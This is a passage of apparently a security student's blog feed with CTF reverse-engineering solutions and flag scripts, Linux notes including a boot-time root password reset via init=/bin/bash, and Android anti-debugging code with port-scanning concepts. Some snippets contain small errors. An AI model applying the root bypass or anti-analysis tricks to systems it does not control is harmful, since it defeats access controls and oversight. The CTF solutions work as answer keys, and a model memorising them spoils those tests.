class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">key1=<span class="string">&quot;Super Secret Key&quot;</span></span><br><span class="line">key2=<span class="built_in">open</span>(<span class="string">&#x27;1.exe&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding = <span class="string">&#x27;unicode-escape&#x27;</span>).read()</span><br><span class="line">num=<span class="built_in">len</span>(key2)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&quot;CTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">x,key2,num</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line"><span class="keyword">if</span> x==key2[i]:</span><br><span class="line">value=i*<span class="number">1337</span>%<span class="number">256</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;%02x&#x27;</span> %value</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> key1:</span><br><span class="line">flag+=search(j,key2,num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag+=<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="secret-string-400"><a href="#secret-string-400" class="headerlink" title="secret-string-400"></a>secret-string-400</h3><ul><li>虚拟机题目</li><li>loadcode内是真正的cmp代码，将其转换为字节码逆写即可，简单异或</li></ul><h3 id="FlareOn2-elfie"><a href="#FlareOn2-elfie" class="headerlink" title="[FlareOn2]elfie"></a>[FlareOn2]elfie</h3><ul><li>py–&gt;exe文件，反编为pyc后pyfcharm去混淆，运行后得到flag明文</li></ul><h3 id="FlareOn6-Snake"><a href="#FlareOn6-Snake" class="headerlink" title="[FlareOn6]Snake"></a>[FlareOn6]Snake</h3><ul><li>nes文件的贪吃蛇游戏，fceux打开debugger即可</li></ul>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2023/03/31/Linux/"/>
      <url>/2023/03/31/Linux/</url>
      
        <content type="html"><![CDATA[<ul><li>kali-root</li><li>linux</li><li>function<span id="more"></span></li></ul><HR color="red"></HR><h2 id="kali-Root-Start"><a href="#kali-Root-Start" class="headerlink" title="kali Root-Start"></a>kali Root-Start</h2><ul><li><a href="https://www.cnblogs.com/qi-yuan/p/13785813.html">kali2020.2实现开机root权限 - 戚源 - 博客园 (cnblogs.com)</a></li><li>ro–&gt;rw</li><li>init&#x3D;&#x2F;bin&#x2F;bash</li><li>change the password of root</li></ul><h2 id="linux指令"><a href="#linux指令" class="headerlink" title="linux指令"></a>linux指令</h2><ul><li>uname，查看系统信息<ul><li>-s：System name</li><li>-n：Network (domain) name</li><li>-r ：Kernel Release number</li><li>-v ：Kernel Version</li><li>-m：Machine (hardware) name</li><li>-a：All of the above</li></ul></li><li>file，查看文件类型</li><li>head，查看文件内容</li><li>ldd，查看文件依赖</li><li>xxd，十六进制转储工具<ul><li>xxd -c 32：每行显示32字节</li><li>xxb -b：二进制显示</li><li>-l：指定转储长度</li></ul></li><li>dd，同转储工具，容易造成文件覆盖</li><li>readelf，elf查看解析<ul><li>readelf -h：查看elf头</li><li>readelf -s：查看符号表</li></ul></li><li>nm，文件符号解析<ul><li>nm -D：解析动态·符号表</li></ul></li><li>c++filt，符号解析（传入参数为要解析的函数）</li><li>strings，查看字符串<ul><li>-n：指定最小字符长度</li><li>-d：只输出data段字符串</li></ul></li><li>strace，显示文件执行时的系统调用<ul><li>strace -p pid：附加到pid进程</li></ul></li><li>ltrace，显示文件执行时的库文件调用</li></ul><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2><h3 id="init-array-amp-fini-array"><a href="#init-array-amp-fini-array" class="headerlink" title="init_array &amp; fini_array"></a>init_array &amp; fini_array</h3><ul><li><p><code>.init_array</code> 和 <code>.fini_array</code> 是两个特殊的节（section），用于初始化和清理全局变量或静态变量。</p></li><li><p>他们包含了一组指向函数的指针，这些函数会在程序启动时自动被调用。这些函数的调用顺序按照它们在节中的顺序执行。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.init_array:0000000000032F10                               ; ELF Initialization Function Table</span><br><span class="line">.init_array:0000000000032F10                               ; ===========================================================================</span><br><span class="line">.init_array:0000000000032F10</span><br><span class="line">.init_array:0000000000032F10                               ; Segment type: Pure data</span><br><span class="line">.init_array:0000000000032F10                               AREA .init_array, DATA, ALIGN=3</span><br><span class="line">.init_array:0000000000032F10                               ; ORG 0x32F10</span><br><span class="line">.init_array:0000000000032F10 C0 0E 01 00 00 00 00 00       off_32F10 DCQ sub_10EC0                </span><br><span class="line">.init_array:0000000000032F10                                                                       </span><br><span class="line">.init_array:0000000000032F10                               ; .init_array ends</span><br><span class="line">.init_array:0000000000032F10</span><br><span class="line">.fini_array:0000000000032F18                               ; ELF Termination Function Table</span><br><span class="line">.fini_array:0000000000032F18                               ; ===========================================================================</span><br><span class="line">.fini_array:0000000000032F18</span><br><span class="line">.fini_array:0000000000032F18                               ; Segment type: Pure data</span><br><span class="line">.fini_array:0000000000032F18                               AREA .fini_array, DATA, ALIGN=3</span><br><span class="line">.fini_array:0000000000032F18                               ; ORG 0x32F18</span><br><span class="line">.fini_array:0000000000032F18 20 D9 00 00 00 00 00 00       DCQ j_nullsub_2</span><br><span class="line">.fini_array:0000000000032F20 10 D9 00 00 00 00 00 00       DCQ start</span><br><span class="line">.fini_array:0000000000032F20                               ; .fini_array ends</span><br><span class="line">.fini_array:0000000000032F20</span><br></pre></td></tr></table></figure><h2 id="thread-amp-pipe"><a href="#thread-amp-pipe" class="headerlink" title="thread &amp; pipe"></a>thread &amp; pipe</h2><ul><li>看的出来逆向涉及父子进程就出这玩意</li></ul><h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><ul><li>文件描述符：可以看作一个已打开文件的索引表。除此之外需要注意，所有执行I&#x2F;O操作的系统调用都通过文件描述符来实现。同时还规定系统刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。</li></ul><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><ul><li>linux进程间相互独立，而pipe（管道）就是进程之间通信的一种方式，可以用来读写数据</li></ul><h4 id="管道创建"><a href="#管道创建" class="headerlink" title="管道创建"></a>管道创建</h4>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-Secuity</title>
      <link href="/2023/03/31/Android-Secuity/"/>
      <url>/2023/03/31/Android-Secuity/</url>
      
        <content type="html"><![CDATA[<ul><li>Android Debug</li><li>Android security mechanism<span id="more"></span></li></ul><HR color="red"></HR><h2 id="Android反调试"><a href="#Android反调试" class="headerlink" title="Android反调试"></a>Android反调试</h2><h3 id="文件检测"><a href="#文件检测" class="headerlink" title="文件检测"></a>文件检测</h3><ul><li>检测某一路径下是否存在调试文件</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dir = <span class="built_in">opendir</span>(<span class="string">&quot;/data/local/tmp&quot;</span>);<span class="comment">//check dir</span></span><br><span class="line">pid = <span class="built_in">getpid</span>();<span class="comment">//获取pid</span></span><br><span class="line">v2 = pid;</span><br><span class="line"><span class="keyword">if</span> ( dir )&#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )&#123;</span><br><span class="line">        v3 = <span class="built_in">readdir</span>(dir);</span><br><span class="line">        v4 = v3 == <span class="number">0</span>;</span><br><span class="line">        filename = (<span class="type">const</span> <span class="type">char</span> *)(v3 + <span class="number">19</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v4 ) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(filename, <span class="string">&quot;android_server&quot;</span>, <span class="number">0xE</span>u) )</span><br><span class="line">            <span class="built_in">kill</span>(v2, <span class="number">9</span>);<span class="comment">//kill debug process</span></span><br><span class="line">    &#125;</span><br><span class="line">    pid = <span class="built_in">closedir</span>(dir, <span class="string">&quot;android_server&quot;</span>, <span class="number">14</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="端口检测"><a href="#端口检测" class="headerlink" title="端口检测"></a>端口检测</h3><ul><li>检测app运行时是否有常用调试端口被使用</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FILE* pfile=<span class="literal">NULL</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span>* strCatTcp= <span class="string">&quot;cat /proc/net/tcp |grep :5D8A&quot;</span>;<span class="comment">//check tcp</span></span><br><span class="line"><span class="type">char</span>* strNetstat=<span class="string">&quot;netstat |grep :23946&quot;</span>;<span class="comment">//check the state of port </span></span><br><span class="line"><span class="comment">//calls popen(), executes a shell and runs commands </span></span><br><span class="line">pfile=<span class="built_in">popen</span>(strCatTcp,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="type">int</span> pid=<span class="built_in">getpid</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">NULL</span>==pfile)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fail\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//kill debug process</span></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">fgets</span>(buf,<span class="built_in">sizeof</span>(buf),pfile))&#123;</span><br><span class="line">    <span class="type">int</span> ret=<span class="built_in">kill</span>(pid,SIGKILL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">pclose</span>(pfile);</span><br></pre></td></tr></table></figure><h3 id="进程名称检测"><a href="#进程名称检测" class="headerlink" title="进程名称检测"></a>进程名称检测</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> bufsize = <span class="number">1024</span>;</span><br><span class="line"><span class="type">char</span> filename[bufsize];</span><br><span class="line"><span class="type">char</span> line[bufsize];</span><br><span class="line"><span class="type">char</span> name[bufsize];</span><br><span class="line"><span class="type">char</span> nameline[bufsize];</span><br><span class="line"><span class="type">int</span> pid = <span class="built_in">getpid</span>();</span><br><span class="line"><span class="comment">//先读取Tracepid的值</span></span><br><span class="line"><span class="built_in">sprintf</span>(filename, <span class="string">&quot;/proc/%d/status&quot;</span>, pid);</span><br><span class="line">FILE *fd=<span class="built_in">fopen</span>(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(fd!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fgets</span>(line,bufsize,fd))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;TracerPid&quot;</span>)!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="type">int</span> statue =<span class="built_in">atoi</span>(&amp;line[<span class="number">10</span>]);</span><br><span class="line">            <span class="keyword">if</span>(statue!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(name,<span class="string">&quot;/proc/%d/cmdline&quot;</span>,statue);</span><br><span class="line">                FILE *fdname=<span class="built_in">fopen</span>(name,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(fdname!= <span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="keyword">while</span>(<span class="built_in">fgets</span>(nameline,bufsize,fdname))</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">strstr</span>(nameline,<span class="string">&quot;android_server&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">                            <span class="type">int</span> ret=<span class="built_in">kill</span>(pid,SIGKILL);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">fclose</span>(fdname);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fclose</span>(fd);</span><br></pre></td></tr></table></figure><h3 id="轮循检测"><a href="#轮循检测" class="headerlink" title="轮循检测"></a>轮循检测</h3><ul><li>同样是对tracepid值的检测</li><li>缺点是如果tracepid不为0会一直消耗内存</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">anti_debugger</span><span class="params">()</span><span class="comment">//创建进程</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    <span class="built_in">pthread_create</span>(&amp;tid,<span class="literal">NULL</span>,&amp;anti_debug_thread,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">anti_debugger_thread</span><span class="params">(<span class="type">void</span>*data)</span><span class="comment">//如果tracepid不为0就死循环阻止程序继续执行</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid=<span class="built_in">getpid</span>();</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">check_debugger</span>(pid)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check_debugger</span><span class="params">(<span class="type">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> pathSize=<span class="number">256</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> bufSize=<span class="number">1024</span>;</span><br><span class="line">    <span class="type">char</span> path[pathSize];</span><br><span class="line">    <span class="type">char</span> line[bufSize];</span><br><span class="line">    <span class="built_in">snprintf</span>(path,<span class="built_in">sizeof</span>(path)<span class="number">-1</span>,<span class="string">&quot;/proc/%d/status&quot;</span>,pid);</span><br><span class="line">    <span class="type">bool</span> result =<span class="literal">true</span>;</span><br><span class="line">    FILE *fp=<span class="built_in">fopen</span>(path,<span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">fgets</span>(line,<span class="built_in">sizeof</span>(line),fp))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strncmp</span>(line,TRACERPID,TRACERPID_LEN)==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">pid_t</span> tracerPid=<span class="number">0</span>;</span><br><span class="line">                <span class="built_in">sscanf</span>(line,<span class="string">&quot;%*s%d&quot;</span>,&amp;tracerPid);</span><br><span class="line">                <span class="keyword">if</span>(!tracerPid)</span><br><span class="line">                result =<span class="literal">false</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fclose</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="父子进程保护"><a href="#父子进程保护" class="headerlink" title="父子进程保护"></a>父子进程保护</h3><ul><li>利用同一时刻一个进程只能被一个进程附加，自己创建一个子进程调试自己，从而阻止其他调试</li></ul><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">attachBaseContext</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.attachBaseContext(context);</span><br><span class="line">        <span class="built_in">this</span>.mContext = context;</span><br><span class="line">        AppInfo.APKPATH = context.getApplicationInfo().sourceDir;</span><br><span class="line">        AppInfo.DATAPATH = context.getApplicationInfo().dataDir;</span><br><span class="line">        <span class="keyword">if</span> (!Debug.isDebuggerConnected()) &#123;<span class="comment">//isDebuggerConnected()</span></span><br><span class="line">            loadLibrary();</span><br><span class="line">            A.a(AppInfo.PKGNAME, AppInfo.APPNAME, AppInfo.APKPATH, AppInfo.DATAPATH, Build.VERSION.SDK_INT, AppInfo.REPORT_CRASH);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Android安全机制"><a href="#Android安全机制" class="headerlink" title="Android安全机制"></a>Android安全机制</h2><h3 id="区域隔离"><a href="#区域隔离" class="headerlink" title="区域隔离"></a>区域隔离</h3><ul><li>系统区和用户区分离，系统区只有读取权限</li></ul><h3 id="进程保护"><a href="#进程保护" class="headerlink" title="进程保护"></a>进程保护</h3><ul><li>独立进程空间，沙箱隔离</li></ul><h3 id="权限模型"><a href="#权限模型" class="headerlink" title="权限模型"></a>权限模型</h3><ul><li>权限声明 —AndroidManifest.xml<ul><li>READ_CONTACTS：读取用户通讯录数据</li><li>RECEIVE_SMS：监测短信通知</li><li>ACCESS_COARSE_LOCATION：通过基站和wifi获取位置信息</li><li>ACCESS_FINE_LOCATION：通过GPS获取位置信息</li></ul></li><li>权限保护划级<ul><li>normal：申请即可用</li><li>dangerous：需要用户确认</li><li>signature：只会赋予与声明权限使用相同证书</li><li>signatureosystem：需要系统或者平台签名</li></ul></li></ul><h3 id="文件访问"><a href="#文件访问" class="headerlink" title="文件访问"></a>文件访问</h3><ul><li>Android apk的安装目录<ul><li>&#x2F;data&#x2F;data 下会有每个应用程序的私有目录</li><li>&#x2F;data&#x2F;app 会保存所有安装文件的APK</li><li>&#x2F;data&#x2F;da1vik-cache 会有每个应用程序的核心文件DEX的缓存文件，主要是为了提高效率。</li><li>&#x2F;System&#x2F;app 通常是系统自带的应用程序目录</li></ul></li><li>每个Android应用程序会在安装时分配一个独有的Linux用户ID，建立一个沙盒，这个用户ID会在安装时分配给它，并在该设备上一直保持同一个数值</li><li>Android 文件存储的4种方式<ul><li>Context. MODE_ PRIVATE: 默认操作模式，代表该文件是私有数据，只能被应用本身访问，在该模式下，写入的内容会覆盖原文件的内容。</li><li>Context. MODE_ APPEND: 内容追加</li><li>Context. MODE_ WORLD_ READABLE：读取权限</li><li>Context. MODE_ WORLD_ WRITEABLE：写入权限</li></ul></li></ul><h3 id="apk签名"><a href="#apk签名" class="headerlink" title="apk签名"></a>apk签名</h3><ul><li>jks、keystore等</li></ul><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><ul><li>对称算法，包括AES、 DES、3DES、 RC5、RC2、PBE</li><li>非对称算法，包括RSA、 DSA、ECC</li><li>杂凑算法，包括SHA1、MD5、MD2</li><li>传输加密<ul><li>Android系统的传输加密支持L2TP&#x2F;IPSEC、 L2TP、 PPTPVPN， 支持SSLV 2. 0\3.0\3.1。</li></ul></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li>传统扫描<ul><li>通过因特网包探索器判断主机是否存在</li><li>ICMP-Echo、Broadcast ICMP、Non-Echo ICMP</li></ul></li><li>TCP（传输控制协议）连接扫描<ul><li>三次握手</li></ul></li><li>TCP同步扫描<ul><li>两次握手</li></ul></li><li>TCPFIN扫描<ul><li>发送FIN控制报文<ul><li>CLOSED端口发送RST控制报文</li><li>LISTEN端口无应答</li></ul></li></ul></li><li>FTP（文件传输协议）反弹攻击</li><li>UDP（用户数据报协议）扫描</li></ul><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><h3 id="特征匹配"><a href="#特征匹配" class="headerlink" title="特征匹配"></a>特征匹配</h3><h3 id="模拟攻击"><a href="#模拟攻击" class="headerlink" title="模拟攻击"></a>模拟攻击</h3><h3 id="沙箱执行"><a href="#沙箱执行" class="headerlink" title="沙箱执行"></a>沙箱执行</h3>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A quick one click startup tool based on wxpython</title>
      <link href="/2023/03/31/Start/"/>
      <url>/2023/03/31/Start/</url>
      
        <content type="html"><![CDATA[<ul><li>A quick one click startup tool based on wxpython<span id="more"></span></li></ul><HR color="red"></HR><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span 